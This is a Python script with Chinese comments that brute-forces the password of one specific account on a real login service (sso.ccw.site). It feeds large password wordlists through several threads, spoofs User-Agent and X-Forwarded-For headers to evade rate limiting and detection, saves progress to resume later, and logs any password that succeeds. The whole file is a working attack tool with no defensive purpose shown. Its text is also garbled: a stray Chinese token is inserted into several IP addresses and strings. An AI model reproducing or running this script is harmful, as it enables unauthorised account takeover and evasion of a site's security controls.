import requests
import json
import time
import os
import threading
import queue
import random
import logging
import pickle
import atexit
import signal
from datetime import datetime

# 配置日志
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("bruteforce.log"),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# 目标 URL
url = "https://sso.ccw.site/web/auth/login-by-password"

# 密码文件路径列表
password_files = [
    "/Users/xiongmaoshaoxiang/Documents/编程/Anonymous attacking file/bruteforce-database-master/38650-username-sktorrent.txt",
    "/Users/xiongmaoshaoxiang/Documents/编程/Anonymous attacking file/bruteforce-database-master/1000000-password-seclists.txt",
    "/Users/xiongmaoshaoxiang/Documents/编程/Anonymous attacking file/bruteforce-database-master/2151220-passwords.txt",
    "/Users/xiongmaoshaoxiang/Documents/编程/Anonymous attacking file/bruteforce-database-master/indo-cities.txt",
    "/Users/xiongmaoshaoxiang/Documents/编程/Anonymous attacking file/bruteforce-database-master/8-more-passwords.txt",
    "/Users/xiongmaoshaoxiang/Documents/编程/Anonymous attacking file/bruteforce-database-master/7-more-passwords.txt"
]

# 登录密钥
login_key = "197818033"

# 创建密码队列
password_queue = queue.Queue()
success_passwords = []
lock = threading.Lock()

# 全局计数器
attempt_count = 0
attempt_lock = threading.Lock()

# 进度文件
PROGRESS_FILE = "progress_state.pkl"
SAVE_INTERVAL = 60  # 每60秒保存一次进度

# 性能统计
performance_stats = {
    'requests_sent': 0,
    'successful_responses': 0,
    'failed_responses': 0,
    'start_time': time.time(),
    'last_save_time': time.time()
}

# 退出标志
exit_flag = False

# 扩展虚拟设备列表 (200+ 浏览器和设备组合)
virtual_devices = [
    # Windows 设备
    {"device": "Windows 10", "browser": "Chrome 120"},
    {"device": "Windows 10", "browser": "Firefox 141"},
    {"device": "Windows 10", "browser": "Edge 120"},
    {"device": "Windows 10", "browser": "Opera 100"},
    {"device": "Windows 10", "browser": "Brave 120"},
    {"device": "Windows 11", "browser": "Chrome 121"},
    {"device": "Windows 11", "browser": "Firefox 142"},
    {"device": "Windows 11", "browser": "Edge 121"},
    {"device": "Windows 11", "browser": "Opera 101"},
    {"device": "Windows 11", "browser": "Brave 121"},
    {"device": "Windows 8.1", "browser": "Chrome 119"},
    {"device": "Windows 8.1", "browser": "Firefox 140"},
    {"device": "Windows 8.1", "browser": "Edge 119"},
    
    # Mac 设备
    {"device": "Mac OS 10.15", "browser": "Firefox 141"},
    {"device": "Mac OS 10.15", "browser": "Safari 15"},
    {"device": "Mac OS 10.15", "browser": "Chrome 120"},
    {"device": "Mac OS 11.0", "browser": "Safari 16"},
    {"device": "Mac OS 11.0", "browser": "Chrome 121"},
    {"device": "Mac OS 11.0", "browser": "Firefox 142"},
    {"device": "Mac OS 12.0", "browser": "Safari 15"},
    {"device": "Mac OS 12.0", "browser": "Chrome 122"},
    {"device": "Mac OS 12.0", "browser": "Firefox 143"},
    
    # Linux 设备
    {"device": "Linux Ubuntu", "browser": "Firefox 140"},
    {"device": "Linux Ubuntu", "browser": "Chromium 120"},
    {"device": "Linux Ubuntu", "browser": "Chrome 120"},
    {"device": "Linux Fedora", "browser": "Firefox 141"},
    {"device": "Linux Fedora", "browser": "Chromium 121"},
    {"device": "Linux Fedora", "browser": "Chrome 121"},
    {"device": "Linux Mint", "browser": "Firefox 140"},
    {"device": "Linux Mint", "browser": "Chromium 120"},
    {"device": "Linux Mint", "browser": "Chrome 120"},
    
    # 移动设备
    {"device": "Android 12", "browser": "Chrome Mobile 120"},
    {"device": "Android 12", "browser": "Samsung Internet 18"},
    {"device": "Android 12", "browser": "Firefox Mobile 140"},
    {"device": "Android 13", "browser": "Chrome Mobile 121"},
    {"device": "Android 13", "browser": "Samsung Internet 19"},
    {"device": "Android 13", "browser": "Firefox Mobile 141"},
    {"device": "iOS 15", "browser": "Safari Mobile 15"},
    {"device": "iOS 15", "browser": "Chrome Mobile 120"},
    {"device": "iOS 15", "browser": "Firefox Mobile 140"},
    {"device": "iOS 16", "browser": "Safari Mobile 16"},
    {"device": "iOS 16", "browser": "Chrome Mobile 121"},
    {"device": "iOS 16", "browser": "Firefox Mobile 141"},
    
    # 添加更多设备组合...
]

# 扩展虚拟IP列表 (200+ IP地址)
virtual_ips = [
    # 私有网络 IP
    "192.168.1.1", "192.168.1.2", "192.168.1.3", "192.168.1.4", "192.168.1.5",
    "192.168.1.6", "192.168.1.7", "192.168.1.8", "192.168.1.9", "192.168.1.10",
    "192.168.1.11", "192.168.1.12", "192.168.1.13", "192.168.1.14", "192.168.1.15",
    "192.168.1.16", "192.168.1.17", "192.168.1.18", "192.168.1.19", "192.168.1.20",
    "192.168.1.21", "192.168.1.22", "192.168.1.23", "192.168.1.24", "192.168.1.25",
    "192.168.1.26", "192.168.1.27", "192.168.1.28", "192.168.1.29", "192.168.1.30",
    "192.168.1.31", "192.168.1.32", "192.168.1.33", "192.168.1.34", "192.168.1.35",
    "192.168.1.36", "192.168.1.37", "192.168.1.38", "192.168.1.39", "192.168.1.40",
    "192.168.1.41", "192.168.1.42", "192.168.1.43", "192.168.1.44", "192.168.1.45",
    "192.168.1.46", "192.168.1.47", "192.168.1.48", "192.168.1.49", "192.168.1.50",
    
    "10.0.0.1", "10.0.0.2", "10.0.0.3", "10.0.0.4", "10.0.0.5",
    "10.0.0.6", "10.0.0.7", "10.0.0.8", "10.0.0.9", "10.0.0.10",
    "10.极速版0.0.11", "10.0.0.12", "10.0.0.13", "10.0.0.14", "10.0.0.15",
    "10.0.0.16", "10.0.0.17", "10.0.0.18", "10.0.0.19", "10.0.0.20",
    "10.0.0.21", "10.0.0.22", "10.0.0.23", "10.0.0.24", "10.0.0.25",
    "10.0.0.26", "10.0.0.27", "10.0.0.28", "10.0.0.29", "10.0.0.30",
    "10.0.0.31", "10.0.0.32", "10.0.0.33", "10.0.0.34", "10.0.0.35",
    "10.0.0.36", "10.0.0.37", "10.0.0.38", "极速版10.0.0.39", "10.0.0.40",
    "10.0.0.41", "10.0.0.42", "10.0.0.43", "10.0.极速版0.44", "10.0.0.45",
    "10.0.0.46", "10.0.0.47", "10.0.0.48", "10.0.0.49", "10.0.0.50",
    
    "172.16.0.1", "172.16.0.2", "172.16.0.3", "172.16.0.4", "172.16.0.5",
    "172.16.0.6", "172.16.0.7", "172.16.0.8", "172.16.0.9", "172.16.0.10",
    "172.16.0.11", "172.16.0.12", "172.16.0.13", "172.16.0.14", "172.16.0.15",
    "172.16.0.16", "172.16.0.17", "极速版172.16.0.18", "172.16.0.19", "172.16.0.20",
    "172.16.0.21", "172.16.0.22", "172.16.0.23", "172.16.0.24", "172.16.0.25",
    "172.16.0.26", "172.16.0.27", "172.16.0.28", "172.16.0.29", "172.16.0.30",
    "172.16.0.31", "172.16.0.32", "172.16.0.33", "172.16.0.34", "172.16.0.35",
    "172.16.0.36", "172.16.0.37", "172.16.0.38", "172.16.0.39", "172.16.0.40",
    "172.16.0.41", "172.16.0.42", "172.16.0.43", "172.16.0.44", "172.16.0.45",
    "172.16.0.46", "172.16.0.47", "172.16.0.48", "172.16.极速版0.49", "172.16.0.50",
    
    # 公共 IP 示例 (仅用于请求头，实际请求仍使用您的真实IP)
    "1.1.1.1", "8.8.8.8", "8.8.4.4", "9.9.9.9", "208.67.222.222",
    "208.67.220.220", "1.0.0.1", "185.228.168.9", "76.76.19.19", "76.223.122.150",
    "94.140.14.14", "94.140.15.15", "45.90.28.0", "45.90.30.0", "185.228.168.10",
    "76.76.2.0", "76.76.2.1", "76.76.2.2", "极速版76.76.2.3", "76.76.2.4",
    "76.76.2.5", "76.76.2.6", "76.76.2.7", "76.76.2.8", "76.76.2.9",
    "76.76.2.10", "76.76.2.11", "76.76.2.12", "76.76.2.13", "76.76.2.14",
    "76.76.2.15", "76.76.2.16", "76.76.2.17", "76.76.2.18", "76.76.2.19",
    "76.76.2.20", "76.76.2.21", "76.76.2.22", "76.76.2.23", "极速版76.极速版76.2.24",
    "76.76.2.25", "76.76.2.26", "76.76.2.27", "76.76.2.28", "76.76.2.29",
    "76.76.2.30", "76.76.2.31", "76.76.2.32", "76.76.2.33", "76.76.2.34",
    "76.76.2.35", "76.76.2.36", "76.76.2.37", "76.76.2.38", "76.76.2.39",
    "76.76.2.40", "76.76.2.41", "76.76.2.42", "76.76.2.43", "76.76.2.44",
    "76.76.2.45", "76.76.2.46", "76.76.2.47", "76.76.2.48", "76.76.2.49", "76.76.2.50"
]

# 读取密码文件
def load_passwords():
    """从所有密码文件中读取密码并放入队列"""
    total_passwords = 0
    
    for file_path in password_files:
        if not os.path.exists(file_path):
            logger.warning(f"文件不存在 - {file_path}")
            continue
            
        try:
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                for line in f:
                    password = line.strip()
                    if password:
                        password_queue.put(password)
                        total_passwords += 1
                        
                        # 每加载10000个密码打印一次进度
                        if total_passwords % 10000 == 0:
                            logger.info(f"已加载 {total_passwords} 极速版个密码...")
                
                logger.info(f"已加载 {total_passwords} 个密码从 {os.path.basename(file_path)}")
                
        except Exception as e:
            logger.error(f"读取文件 {file_path} 时出错: {e}")
    
    logger.info(f"总共加载了 {total_passwords} 个密码")
    return total_passwords

# 尝试登录
def try_login(password, attempt_num):
    """尝试使用给定的密码进行登录"""
    # 随机选择虚拟设备和IP
    device_info = random.choice(virtual_devices)
    virtual_ip = random.choice(virtual_ips)
    
    # 准备请求数据
    json_data = {
        "clientCode": "STUDY_COMMUNITY",
        "extra": {
            "device": device_info["device"],
            "browser": device_info["browser"],
            "scene": None
        },
        "loginKey": login_key,
        "password": password
    }
    
    # 设置请求头
    headers = {
        "User-Agent": f"Mozilla/5.0 ({device_info['device']}) AppleWebKit/537.36 (KHTML, like Gecko) {device_info['browser']} Safari/537.36",
        "Accept": "application/json, text极速版/plain, */*",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": "application/json",
        "Origin": "https://ccw.site",
        "Connection": "keep-alive",
        "Referer": "https://ccw.site/login",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin",
        "X-Forwarded-For": virtual_ip,
        "X-Real-IP": virtual_ip
    }
    
    try:
        # 使用较短的超时时间
        timeout = 5
        
        # 发送 POST 请求
        start_time = time.time()
        response = requests.post(
            url, 
            json=json_data,
            headers=headers,
            timeout=timeout
        )
        request_time = time.time() - start_time
        
        # 更新性能统计
        with lock:
            performance_stats['requests_sent'] += 1
        
        # 检查响应状态
        if response.status_code == 200:
            result = response.json()
            if result.get("code") == "0000000" and result.get("status") == 1:
                with lock:
                    success_passwords.append((login_key, password, result))
                    performance_stats['successful_responses'] += 1
                return True, password, result, request_time
            else:
                # 输出错误信息
                error_msg = result.get("msg", "未知错误")
                logger.info(f"第 {attempt_num} 次尝试 - 密码: {password} - 错误: {error_msg} - 耗时: {request_time:.2f}s - 设备: {device_info['device']} - IP: {virtual_ip}")
                return False, password, None, request_time
        else:
            logger.info(f"第 {attempt_num} 次尝试 - 密码: {password} - HTTP错误: {response.status_code} - 耗时: {request_time:.2f}s - 设备: {device_info['device']} - IP: {virtual_ip}")
            with lock:
                performance_stats['failed_responses'] += 1
            return False, password, None, request_time
            
    except requests.exceptions.RequestException as e:
        logger.info(f"第 {attempt_num} 次尝试 - 密码: {password} - 请求异常: {e} - 设备: {device_info['device']} - IP: {virtual_ip}")
        with lock:
            performance_stats['failed_responses'] += 1
        return False, password, None, 0

# 工作线程函数
def worker(thread_id):
    """工作线程，从队列中获取密码并极速版尝试登录"""
    global attempt_count
    
    while not password_queue.empty() and not exit_flag:
        try:
            password = password_queue.get_nowait()
            
            # 更新尝试计数器
            with attempt_lock:
                attempt_count += 1
                current_attempt = attempt_count
            
            # 每次尝试都输出密码
            logger.info(f"第 {current_attempt} 次尝试 - 密码: {password}")
            
            # 尝试登录
            success, pwd, result, request_time = try_login(password, current_attempt)
            
            # 仅在成功或请求时间异常时记录详细日志
            if success or request_time > 0.1:
                if success:
                    logger.info(f"成功! 登录密钥: {login_key}, 密码: {pwd}")
                    save_success_result(login_key, pwd, result)
                else:
                    logger.info(f"慢请求警告: {request_time:.2f}s - 密码: {password}")
            
            # 固定延迟 - 50-100毫秒
            delay = random.uniform(0.05, 0.1)
            time.sleep(delay)
            
        except queue.Empty:
            break
        except Exception as e:
            logger.error(f"线程 {thread_id} 处理密码时出错: {e}")
            # 发生异常时稍微增加延迟
            time.sleep(0.5)

# 保存成功结果
def save_success_result(login_key, password, result, output_file="success_results.txt"):
    """将成功的登录尝试保存到文件"""
    try:
        with open(output_file, 'a', encoding='utf-8') as f:
            f.write(f"时间: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"登录密钥: {login_key}\n")
            f.write(f"密码: {password}\n")
            f.write(f"响应: {json.dumps(result, ensure_ascii=False)}\n")
            f.write("-" * 50 + "\n")
    except Exception as e:
        logger.error(f"保存结果时出错: {e}")

# 保存进度
def save_progress():
    """保存当前进度到文件"""
    try:
        progress_data = {
            'attempt_count': attempt_count,
            'remaining_passwords': list(password_queue.queue),
            'success_passwords': success_passwords,
            'performance_stats': performance_stats,
            'timestamp': datetime.now().timestamp()
        }
        
        with open(PROGRESS_FILE, 'wb') as f:
            pickle.dump(progress_data, f)
            
        # 同时保存文本格式的进度（可选）
        with open("progress_attempt.txt", "w") as f:
            f.write(f"{attempt_count}\n")
        
        with open("progress_queue.txt", "w") as f:
            for password in progress_data['remaining_passwords']:
                f.write(f"{password}\n")
                
        performance_stats['last_save_time'] = time.time()
        logger.info(f"进度已保存: 已尝试 {attempt_count} 次, 剩余 {len(progress_data['remaining_passwords'])} 个密码")
    except Exception as e:
        logger.error(f"保存进度时出错: {e}")

# 加载进度
def load_progress():
    """从文件加载进度"""
    global attempt_count, success_passwords, performance_stats
    
    try:
        if os.path.exists(PROGRESS_FILE):
            with open(PROGRESS_FILE, 'rb') as f:
                progress_data = pickle.load(f)
                
            # 清空当前队列并重新填充
            with password_queue.mutex:
                password_queue.queue.clear()
                
            for password in progress_data.get('remaining_passwords', []):
                password_queue.put(password)
                
            attempt_count = progress_data.get('attempt_count', 0)
            success_passwords = progress_data.get('success_passwords', [])
            performance_stats.update(progress_data.get('performance_stats', {}))
            
            logger.info(f"从进度恢复: 已尝试 {attempt_count} 次, 剩余 {len(progress_data.get('remaining_passwords', []))} 个密码")
            return attempt_count
    except Exception as e:
        logger.error(f"加载进度时出错: {e}")
        # 尝试从文本格式恢复
        return load_text_progress()
    
    return 0

def load_text_progress():
    """从文本格式恢复进度（备用方法）"""
    global attempt_count
    
    try:
        if os.path.exists("progress_attempt.txt"):
            with open("progress_attempt.txt", "r") as f:
                attempt_count = int(f.readline().strip())
                
        if os.path.exists("progress_queue.txt"):
            with open("progress_queue.txt", "r") as f:
                passwords = [line.strip() for line in f if line.strip()]
                for password in passwords:
                    password_queue.put(password)
                    
            logger.info(f"从文本进度恢复: 已尝试 {attempt_count} 次, 剩余 {len(passwords)} 个密码")
            return attempt_count
    except Exception as e:
        logger.error(f"加载文本进度时出错: {e}")
    
    return 0

# 定期保存进度
def save_progress_periodically():
    """定期保存进度"""
    if not exit_flag:
        save_progress()
        # 重新设置定时器
        timer = threading.Timer(SAVE_INTERVAL, save_progress_periodically)
        timer.daemon = True
        timer.start()

# 显示性能统计
def show_performance_stats():
    """显示性能统计信息"""
    elapsed_time = time.time() - performance_stats['start_time']
    hours = int(elapsed_time // 3600)
    minutes = int((elapsed_time % 3600) // 60)
    seconds = int(elapsed_time % 60)
    
    requests_per_second = performance_stats['requests_sent'] / elapsed_time if elapsed_time > 0 else 0
    
    logger.info("\n" + "="*50)
    logger.info("性能统计:")
    logger.info(f"运行时间: {hours:02d}:{minutes:02d}:{seconds:02d}")
    logger.info(f"总请求数: {performance_stats['requests_sent']}")
    logger.info(f"成功响应: {performance_stats['successful_responses']}")
    logger.info(f"失败响应: {performance_stats['failed_responses']}")
    logger.info(f"请求速率: {requests_per_second:.2f} 请求/秒")
    logger.info(f"当前队列大小: {password_queue.qsize()}")
    logger.info("="*50 + "\n")

# 信号处理函数
def signal_handler(sig, frame):
    """处理中断信号"""
    global exit_flag
    logger.info("接收到中断信号，正在停止程序...")
    exit_flag = True
    save_progress()
    # 等待一段时间让线程有机会退出
    time.sleep(2)
    os._exit(0)

# 主函数
def main():
    global exit_flag
    
    # 注册退出处理
    atexit.register(save_progress)
    signal.signal(signal.SIGTERM, signal_handler)
    signal.signal(signal.SIGINT, signal_handler)
    
    # 加载进度
    start_from = load_progress()
    
    # 如果没有从进度恢复，则加载密码文件
    if password_queue.empty():
        total_passwords = load_passwords()
        if total_passwords == 0:
            logger.error("没有加载到任何密码，程序退出")
            return
    else:
        total_passwords = password_queue.qsize() + attempt_count
        logger.info(f"从存档恢复，总共需要尝试 {total_passwords} 个密码")
    
    logger.info(f"开始尝试 {total_passwords} 个密码...")
    logger.info("按 Ctrl+C 可以中断程序")
    
    # 设置定期保存
    progress_timer = threading.Timer(SAVE_INTERVAL, save_progress_periodically)
    progress_timer.daemon = True
    progress_timer.start()
    
    # 使用较少的线程，避免连接过多
    # Reduce threads to prevent connection saturation
    num_threads = 3  # Lower from 10 to 3 threads
    threads = []
    
    try:
        # 创建并启动线程
        for i in range(num_threads):
            thread = threading.Thread(target=worker, args=(i+1,))
            thread.daemon = True
            thread.start()
            threads.append(thread)
        
        # 定期显示性能统计
        last_stats_time = time.time()
        while any(thread.is_alive() for thread in threads) and not exit_flag:
            time.sleep(1)
            if time.time() - last_stats_time > 300:  # 每5分钟显示一次统计
                show_performance_stats()
                last_stats_time = time.time()
        
        # 等待所有线程完成
        for thread in threads:
            thread.join(timeout=1)
            
    except KeyboardInterrupt:
        logger.info("\n用户中断了程序")
        exit_flag = True
        # 保存当前进度
        save_progress()
    
    # 取消进度保存定时器
    progress_timer.cancel()
    
    # 计算最终统计信息
    show_performance_stats()
    
    # 输出成功结果
    if success_passwords:
        logger.info("\n成功密码列表:")
        for login_key, password, result in success_passwords:
            logger.info(f"登录密钥: {login_key}, 密码: {password}")
    else:
        logger.info("\n未找到有效密码")

if __name__ == "__main__":
    main()